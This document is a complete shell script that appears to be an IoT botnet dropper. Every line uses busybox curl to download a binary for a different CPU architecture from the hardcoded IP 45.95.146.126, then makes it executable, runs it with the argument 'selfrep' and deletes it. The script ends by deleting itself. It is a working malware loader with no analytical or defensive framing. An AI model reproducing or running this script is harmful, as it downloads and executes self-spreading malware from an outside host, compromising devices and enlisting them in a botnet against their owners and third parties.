#!/bin/sh
/bin/busybox curl http://45.95.146.126/jklarm -o jklarm;/bin/busybox chmod +x jklarm;./jklarm selfrep;/bin/busybox rm -rf jklarm
/bin/busybox curl http://45.95.146.126/jklarm5 -o jklarm5;/bin/busybox chmod +x jklarm5;./jklarm5 selfrep;/bin/busybox rm -rf jklarm5
/bin/busybox curl http://45.95.146.126/jklarm6 -o jklarm6;/bin/busybox chmod +x jklarm6;./jklarm6 selfrep;/bin/busybox rm -rf jklarm6
/bin/busybox curl http://45.95.146.126/jklarm7 -o jklarm7;/bin/busybox chmod +x jklarm7;./jklarm7 selfrep;/bin/busybox rm -rf jklarm7
/bin/busybox curl http://45.95.146.126/jklm68k -o jklm68k;/bin/busybox chmod +x jklm68k;./jklm68k selfrep;/bin/busybox rm -rf jklm68k
/bin/busybox curl http://45.95.146.126/jklmips -o jklmips;/bin/busybox chmod +x jklmips;./jklmips selfrep;/bin/busybox rm -rf jklmips
/bin/busybox curl http://45.95.146.126/jklmpsl -o jklmpsl;/bin/busybox chmod +x jklmpsl;./jklmpsl selfrep;/bin/busybox rm -rf jklmpsl
/bin/busybox curl http://45.95.146.126/jklppc -o jklppc;/bin/busybox chmod +x jklppc;./jklppc selfrep;/bin/busybox rm -rf jklppc
/bin/busybox curl http://45.95.146.126/jklsh4 -o jklsh4;/bin/busybox chmod +x jklsh4;./jklsh4 selfrep;/bin/busybox rm -rf jklsh4
/bin/busybox curl http://45.95.146.126/jklspc -o jklspc;/bin/busybox chmod +x jklspc;./jklspc selfrep;/bin/busybox rm -rf jklspc
/bin/busybox curl http://45.95.146.126/jklx86 -o jklx86;/bin/busybox chmod +x jklx86;./jklx86 selfrep;/bin/busybox rm -rf jklx86
/bin/busybox curl http://45.95.146.126/jklarc -o jklarc;/bin/busybox chmod +x jklarc;./jklarc selfrep;/bin/busybox rm -rf jklarc

/bin/busybox rm -rf curl.sh
